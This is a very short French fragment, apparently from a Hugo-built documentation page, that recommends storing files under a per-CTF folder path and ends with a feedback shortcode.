- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}